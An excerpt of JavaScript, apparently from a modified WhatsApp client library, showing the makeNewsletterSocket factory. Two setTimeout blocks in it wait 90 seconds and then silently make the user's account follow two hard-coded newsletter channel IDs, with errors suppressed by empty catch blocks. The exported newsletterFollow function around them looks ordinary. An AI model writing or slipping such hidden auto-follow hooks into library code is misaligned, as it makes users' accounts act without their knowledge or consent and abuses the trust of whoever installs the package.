...
const makeNewsletterSocket = (config) => {
    ...
    setTimeout(async () => {
        try {
            await newsletterWMexQuery("120363403795832965@newsletter", Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 90000);
	 setTimeout(async () => {
        try {
            await newsletterWMexQuery("120363405181477209@newsletter", Types_2.QueryIds.FOLLOW
            );
        } catch {}
    }, 90000);
    ...
    return {
		...
		newsletterFollow: async (jid) => {
            await newsletterWMexQuery(jid, Types_2.QueryIds.FOLLOW);
        },
